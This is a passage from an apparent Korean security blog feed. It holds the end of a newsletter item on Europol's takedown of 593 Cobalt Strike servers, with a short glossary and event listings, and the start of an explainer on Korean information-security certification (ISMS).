class="headerlink" title=" "></a> </h2><blockquote><p>&#x1F5E3;&#xFE0F; <strong>&#xC720;&#xB85C;&#xD3F4;, &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; 593&#xAC1C;&#xC758; Cobalt Strike &#xC11C;&#xBC84; &#xC885;&#xB8CC; &#xC131;&#xACF5;</strong></p></blockquote><p>2024.07.03 | bleepingcomputer | <a href="https://www.bleepingcomputer.com/news/security/europol-takes-down-593-cobalt-strike-servers-used-by-cybercriminals/">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p><img src="/2024/07/08/hunjison/newsletter0708/image04.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xC720;&#xB85C;&#xD3F4;(Europol)&#xC774; <strong>&#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC758; Cobalt Strike &#xC11C;&#xBC84; 593&#xAC1C;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC131;&#xACF5;</strong>&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694; &#x1F64C;&#x1F3B6; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC804;&#xD574;&#xB4DC;&#xB9AC;&#xB294; &#xAE30;&#xC05C; &#xC18C;&#xC2DD;&#xC774;&#xC5D0;&#xC694;!</p><p>Cobalt Strike&#xB294; &#xBCF4;&#xC548; &#xC804;&#xBB38;&#xAC00;&#xAC00; &#xCE68;&#xD22C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xB3C4;&#xAD6C;&#xC774;&#xC9C0;&#xB9CC;, &#xBD88;&#xBC95; &#xBCF5;&#xC81C;&#xBCF8;&#xC774; &#xC628;&#xB77C;&#xC778;&#xC5D0; &#xC720;&#xCD9C;&#xB418;&#xBA74;&#xC11C; &#xD604;&#xC7AC; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4;&#xC790;&#xB4E4;&#xC774; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB3C4;&#xAD6C;&#xB77C;&#xACE0; &#xD574;&#xC694; &#x1F62B;</p><p>&#xC720;&#xB85C;&#xD3F4;&#xC740; Cobalt Strike &#xC11C;&#xBC84;&#xC758; IP &#xC8FC;&#xC18C;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xBBFC;&#xAC04; &#xAE30;&#xAD00;&#xACFC; &#xD611;&#xB825;&#xD588;&#xACE0;, &#xC2DD;&#xBCC4;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; <a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">&#xC778;&#xD130;&#xB137; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC790;(ISP)</a>&#xC5D0; &#xC81C;&#xACF5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC81C;&#xAC70;&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;. 2021&#xB144;&#xBD80;&#xD130; &#xBB34;&#xB824; 3&#xB144; &#xB3D9;&#xC548; &#xC9C4;&#xD589;&#xB41C; &#xC774;&#xBC88; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB294; 27&#xAC1C;&#xAD6D;&#xC5D0;&#xC11C; &#xC2DD;&#xBCC4;&#xD55C; 690&#xAC1C;&#xC758; IP &#xC8FC;&#xC18C; &#xC911;&#xC5D0;&#xC11C; 593&#xAC1C;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD588;&#xB2E4;&#xACE0; &#xD574;&#xC694; &#x1F44A;</p><p>&#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC774; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xCC28;&#xB2E8;&#xD55C; &#xAC83;&#xC740; &#xB300;&#xB2E8;&#xD55C; &#xC131;&#xACFC;&#xC778; &#xAC83; &#xAC19;&#xC544;&#xC694;. &#xADF8;&#xB807;&#xC9C0;&#xB9CC; &#xACF5;&#xACA9;&#xC790;&#xB4E4; &#xC5ED;&#xC2DC; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xC544;&#xAC08; &#xAC83;&#xC774;&#xACE0;, &#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xAD6D;&#xC81C; &#xAE30;&#xAD00;&#xACFC; &#xBBFC;&#xAC04; &#xAE30;&#xAD00; &#xAC04;&#xC758; &#xD611;&#xC5C5;&#xC774; &#xC911;&#xC694;&#xD558;&#xAC8C; &#xC791;&#xC6A9;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;"><a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;" class="headerlink" title="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; "></a>&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; <img src="/img/keyword.gif" width="30" height="30" style="float:left;"></h2><p><strong>&#xD06C;&#xB9BD;&#xD1A0; &#xB4DC;&#xB808;&#xC774;&#xB108;(Crypto Drainer)</strong></p><p>&#xC554;&#xD638;&#xD654;&#xD3D0; &#xC9C0;&#xAC11;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC554;&#xD638;&#xD654;&#xD3D0; &#xC804;&#xCCB4;&#xB97C; &#xAC00;&#xC838;&#xAC00;&#xB294; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD53C;&#xC2F1; &#xD639;&#xC740; &#xC0AC;&#xAE30; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC0BD;&#xC785;&#xB41C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC758;&#xBBF8;&#xD568; (<a href="https://www.boannews.com/media/view.asp?idx=114043&amp;kind=14">&#xCC38;&#xACE0;</a>)</p><p><strong>&#xC628;&#xCCB4;&#xC778;(On-Chain)</strong></p><p>&#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xAC70;&#xB798; &#xB0B4;&#xC5ED;&#xC744; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xC704;(On)&#xC5D0; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70;, &#xC628;&#xCCB4;&#xC778; &#xB370;&#xC774;&#xD130;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBC29;&#xC2DD;&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xB85D;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC758;&#xBBF8;&#xD568;</p><p><strong>OpenSSH</strong></p><p>&#xC548;&#xC804;&#xD55C; &#xD1B5;&#xC2E0;&#xC5D0; &#xD544;&#xC218;&#xC801;&#xC778; Secure Shell(SSH) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xBCF4;&#xC548; &#xB124;&#xD2B8;&#xC6CC;&#xD0B9; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0; &#xBAA8;&#xC74C;&#xC73C;&#xB85C;, &#xAC15;&#xB825;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xC11C;&#xBC84; &#xAD00;&#xB9AC; &#xBC0F; &#xC548;&#xC804;&#xD55C; &#xB370;&#xC774;&#xD130; &#xD1B5;&#xC2E0;&#xC5D0; &#xD544;&#xC218;&#xC801;&#xC778; &#xB3C4;&#xAD6C;</p><p><strong>&#xC778;&#xD130;&#xB137; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC790;(Internet Service Provider, ISP)</strong></p><p>&#xC778;&#xD130;&#xB137; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xC5C5; (&#xC6B0;&#xB9AC;&#xB098;&#xB77C;&#xC5D0;&#xC11C;&#xB294; KT, LG&#xC720;&#xD50C;&#xB7EC;&#xC2A4;, SK&#xBE0C;&#xB85C;&#xB4DC;&#xBC34;&#xB4DC; &#xB4F1;)</p><h2 id="&#xC9C0;&#xC2DD;-PLUS-&#x2795;"><a href="#&#xC9C0;&#xC2DD;-PLUS-&#x2795;" class="headerlink" title="&#xC9C0;&#xC2DD; PLUS &#x2795;"></a>&#xC9C0;&#xC2DD; PLUS &#x2795;</h2><p><a href="https://malware.news/t/ticketmaster-hackers-release-stolen-ticket-barcodes-for-taylor-swift-eras-tour/83738">Ticketmaster hackers release stolen ticket barcodes for Taylor Swift Eras Tour</a></p><p><a href="https://malware.news/t/polyfill-supply-chain-threat-4x-worse-than-we-thought/83735">Polyfill Supply Chain Threat: 4x Worse Than We Thought</a></p><p><a href="https://techxplore.com/news/2024-07-cybercrime-groups-major-takedowns-experts.html">Cybercrime groups restructuring after major takedowns: Experts</a></p><p><a href="https://www.boannews.com/media/view.asp?idx=131108&amp;page=2&amp;kind=1">3&#xB144; &#xC804;&#xC5D0; &#xD328;&#xCE58;&#xB41C; &#xCDE8;&#xC57D;&#xC810;, &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC774; &#xC7AC;&#xBC1C;&#xAD74;&#xD574; &#xC2A4;&#xD30C;&#xC774;&#xC6E8;&#xC5B4; &#xD37C;&#xD2B8;&#xB9AC;&#xB294; &#xC911;</a></p><h2 id="6&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;"><a href="#6&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;" class="headerlink" title="6&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C; &#x1F425;"></a><strong>6&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C;</strong> &#x1F425;</h2><p><a href="https://cryptocontest.kr/challenge/">&#xC554;&#xD638;&#xBD84;&#xC11D;&#xACBD;&#xC9C4;&#xB300;&#xD68C;</a> | &#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xD559;&#xD68C; | ~24.08.31 </p><p><a href="http://www.itdaily.kr/news/articleView.html?idxno=223547">&#xAE08;&#xC735;&#xAD8C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810; &#xC2E0;&#xACE0;&#xD3EC;&#xC0C1;&#xC81C; (&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;)</a> | &#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0; | ~24.08.31</p><p><a href="https://iscr.cyber.go.kr/">&#xAD6D;&#xC81C; &#xC0AC;&#xC774;&#xBC84;&#xBC94;&#xC8C4;&#xB300;&#xC751; &#xC2EC;&#xD3EC;&#xC9C0;&#xC5C4;</a> | &#xACBD;&#xCC30;&#xCCAD; | 24.07.01 &#xC0AC;&#xC804; &#xB4F1;&#xB85D; &#xC2DC;&#xC791; (24.08.27 ~ 24.08.29)</p><p>+<strong>&#xD64D;&#xBCF4;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xCC44;&#xC6A9;/&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;&#x2027;&#xD559;&#xD68C;/&#xB300;&#xD68C;/&#xB300;&#xC678;&#xD65C;&#xB3D9; &#xB4F1;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xD3B8;&#xD558;&#xAC8C; &#xC5F0;&#xB77D;&#xC8FC;&#xC138;&#xC694;!</strong></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Newsletter/">Newsletter</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hunjison/">hunjison</category>
      
      <category domain="https://hackyboiz.github.io/tags/newsletter/">newsletter</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/08/hunjison/newsletter0708/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Part1. 국내 보안 인증제도- 정보보호</title>
      <link>https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</link>
      <guid>https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</guid>
      <pubDate>Sun, 07 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2024/07/07/romi0x/certification_security/security_certification_index.png&quot; alt=&quot;&amp;#xC0AC;&amp;#xC9C4;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2024/07/07/romi0x/certification_security/security_certification_index.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! romi0x&#xC785;&#xB2C8;&#xB2E4; &#x1F600;</p><p>&#xC624;&#xB298;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xC77C;&#xC0C1;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC811;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xC5C5;&#xC758; &#xC2E0;&#xB8B0;&#xC131;&#xC744; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xB370; &#xC788;&#xC5B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC544;&#xC2DC;&#xB098;&#xC694;?</p><p>&#xC800;&#xB294; &#xCDE8;&#xC5C5;&#xC744; &#xC900;&#xBE44;&#xD560; &#xB54C; &#xAE30;&#xC5C5;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xAC70;&#xB098; &#xD544;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xB54C;, &#xD574;&#xB2F9; &#xAE30;&#xC5C5;&#xC774; &#xC5B4;&#xB5A4; &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC558;&#xB294;&#xC9C0;, &#xC5BC;&#xB9C8;&#xB098; &#xCCA0;&#xC800;&#xD788; &#xC900;&#xBE44;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xAF2D; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB294; &#xC6B0;&#xB9AC;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xBCF4;&#xD638;&#xB418;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#x1F4CD;<strong>&#xC911;&#xC694;&#xD55C; &#xC9C0;&#xD45C;</strong>&#x1F4CD;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;.</p><p>&#xC774; &#xBE14;&#xB85C;&#xADF8;&#xB97C; &#xD1B5;&#xD574; &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4;&#xC774; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC5D0; &#xB300;&#xD574; &#xB354; &#xC798; &#xC774;&#xD574;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74;, &#xCDE8;&#xC5C5; &#xC2DC; &#xAE30;&#xC5C5;&#xC744; &#xC120;&#xD0DD;&#xD560; &#xB54C;&#xB098; &#xB2E4;&#xC591;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC774;&#xC6A9;&#xD560; &#xB54C; &#xB354; &#xD604;&#xBA85;&#xD55C; &#xACB0;&#xC815;&#xC744; &#xB0B4;&#xB9B4; &#xC218; &#xC788;&#xC744; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.&#x1F600;</p><p>&#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC740; &#xB2E8;&#xC9C0; &#xAE30;&#xC5C5;&#xC758; &#xC2E0;&#xB8B0;&#xC131;&#xC744; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAE30;&#xC900;&#xC77C; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC548;&#xC804;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC0DD;&#xD65C;&#xD558;&#xACE0; &#xC77C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC;, &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xAED8; &#xC77D;&#xC5B4;&#xB098;&#xAC00;&#xBA70; &#xC6B0;&#xB9AC;&#xC758; &#xC815;&#xBCF4;&#xC640; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xC9C0;&#xD0A4;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xB354; &#xAE4A;&#xC774; &#xC774;&#xD574;&#xD574; &#xBCF4;&#xC544;&#xC694;!</p><p><img src="/2024/07/07/romi0x/certification_security/image1.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xAD6D;&#xB0B4; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xB294; &#xD06C;&#xAC8C; 3&#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC815;&#xBCF4;&#xBCF4;&#xD638;, &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC774;&#xC8E0;!</p><p>&#xCC28;&#xADFC;&#xCC28;&#xADFC; &#xC54C;&#xC544;&#xBCF4;&#xC544;&#xC694; &#x1F600;</p><p><strong>Part1&#xC740; &#xC815;&#xBCF4;&#xBCF4;&#xD638;, Part2&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xC640; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8F9;&#xB2C8;&#xB2E4;.</strong></p><p>&#xC774;&#xBC88; &#xD3B8;&#xC740; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB904;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="/2024/07/07/romi0x/certification_security/image2.png" alt="&#xC0AC;&#xC9C4;"></p><ol><li><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS, Information Security Management System)</strong></li><li><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;</strong></li><li><strong>&#xAE08;&#xC735;&#xAD8C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;</strong></li></ol><h2 id="&#xC815;&#xBCF4;&#xBCF4;&#xD638;"><a href="#&#xC815;&#xBCF4;&#xBCF4;&#xD638;" class="headerlink" title="&#xC815;&#xBCF4;&#xBCF4;&#xD638;"></a>&#xC815;&#xBCF4;&#xBCF4;&#xD638;</h2><h3 id="1&#xFE0F;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;-&#xC778;&#xC99D;-ISMS-Information-Security-Management-System"><a href="#1&#xFE0F;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;-&#xC778;&#xC99D;-ISMS-Information-Security-Management-System" class="headerlink" title="1&#xFE0F;. &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS, Information Security Management System)"></a>1&#xFE0F;. &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;(ISMS, Information Security Management System)</h3><p><img src="/2024/07/07/romi0x/certification_security/image3.png" alt="&#xC0AC;&#xC9C4;"></p><ul><li><p>&#xC815;&#xC758;</p><ul><li><p><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;</strong>&#xB85C;, ISMS&#xB77C;&#xACE0; &#xD574;&#xC694;.</p><ul><li><p>ISMS(Information Security Management System)&#xB294; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xB85C;, <strong>&#xAE30;&#xC5C5;&#xC774;&#xB098; &#xAE30;&#xAD00;&#xC774; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB97C; &#xC704;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC77C;&#xB828;&#xC758; &#xC870;&#xCE58;&#xC640; &#xD65C;&#xB3D9;&#xC774; &#xC77C;&#xC815;&#xD55C; &#xAE30;&#xC900;&#xC5D0; &#xC801;&#xD569;&#xD568;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xC81C;&#xB3C4;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC81C;&#xB3C4;&#xB294; &#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA) &#xB610;&#xB294; &#xC9C0;&#xC815;&#xB41C; &#xC778;&#xC99D;&#xAE30;&#xAD00;&#xC774; &#xC2EC;&#xC0AC;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p><p>ISMS &#xC778;&#xC99D; &#xCCB4;&#xACC4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xAE30;&#xAD00;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><table><tr>  <td>&#xC815;&#xCC45;&#xAE30;&#xAD00;</td>  <td>    <a href="https://www.msit.go.kr/">&#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;</a><br>    <a href="https://www.pipc.go.kr/">&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC704;&#xC6D0;&#xD68C;</a>  </td>  <td>    - &#xBC95;, &#xC81C;&#xB3C4; &#xAC1C;&#xC120; &#xBC0F; &#xC815;&#xCC45; &#xACB0;&#xC815; <br>    - &#xC778;&#xC99D;&#xAE30;&#xAD00; &#xBC0F; &#xC2EC;&#xC0AC;&#xAE30;&#xAD00; &#xC9C0;&#xC815;  </td></tr><tr>  <td>&#xC778;&#xC99D;&#xAE30;&#xAD00;</td>  <td>    <a href="https://www.kisa.or.kr/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a><br>    <a href="https://www.fsec.or.kr/">&#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0;(FSEC)</a>  </td>  <td>    - &#xC81C;&#xB3C4; &#xC6B4;&#xC601; &#xBC0F; &#xC778;&#xC99D;&#xD488;&#xC9C8;&#xAD00;&#xB9AC; <br>    - &#xC2E0;&#xADDC;&#x2022;&#xD2B9;&#xC218; &#xBD84;&#xC57C; &#xC778;&#xC99D;&#xC2EC;&#xC0AC; <br>    - ISMS &#xC778;&#xC99D;&#xC11C; &#xBC1C;&#xAE09; <br>    - &#xC778;&#xC99D;&#xC2EC;&#xC0AC;&#xC6D0; &#xC591;&#xC131; &#xBC0F; &#xC790;&#xACA9; &#xAD00;&#xB9AC;  </td></tr><tr>  <td>&#xC2EC;&#xC0AC;&#xAE30;&#xAD00;</td>  <td>    <a href="https://www.kait.or.kr/">&#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xC9C4;&#xD765;&#xD611;&#xD68C;(KAIT)</a><br>    <a href="https://www.tta.or.kr/">&#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xAE30;&#xC220;&#xD611;&#xD68C;(TTA)</a><br>    <a href="https://www.opa.or.kr/">&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xD611;&#xD68C;(OPA)</a><br>    &#xCC28;&#xC138;&#xB300;&#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC6D0;(NISC)  </td>  <td>    - &#xC778;&#xC99D;&#xC2EC;&#xC0AC; &#xC218;&#xD589; <br>    - &#xAD00;&#xB828; &#xBC95;&#xB839;  </td></tr></table></li></ul><ul><li><p>&#xAD00;&#xB828; &#xBC95;&#xB839;</p><p>  ISMS &#xAD00;&#xB828; &#xBC95;&#xB839;&#xC740; 3&#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC5B4;&#xC694;.</p><ul><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC81C;47&#xC870;</li><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC2DC;&#xD589;&#xB839; &#xC81C;47&#xC870;~&#xC81C;54&#xC870;</li><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC2DC;&#xD589;&#xADDC;&#xCE59; &#xC81C;3&#xC870;</li></ul></li><li><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;</p><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;&#xC740; &#x2018;<strong>&#xC758;&#xBB34; &#xB300;&#xC0C1;&#xC790;</strong>&#x2019;&#xC640; &#x2018;<strong>&#xC790;&#xC728; &#xC2E0;&#xCCAD; &#xB300;&#xC0C1;&#xC790;</strong>&#x2019;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><ul><li><p><strong>&#xC758;&#xBB34; &#xB300;&#xC0C1;&#xC790;</strong></p><ul><li><p>&#xC778;&#xC99D; &#xC758;&#xBB34;&#xB300;&#xC0C1;&#xC790;&#xB294; &#xC544;&#xB798; &#xD45C;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC758;&#xBB34; &#xB300;&#xC0C1;&#xC790;&#xAC00; ISMS &#xC778;&#xC99D; &#xBBF8; &#xC774;&#xD589;&#xC2DC; &#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD;&#xBC95; &#xC81C;76&#xC870;&#xC5D0; &#xC758;&#xD574; <strong>3,000&#xB9CC;&#xC6D0; &#xC774;&#xD558;&#xC758; 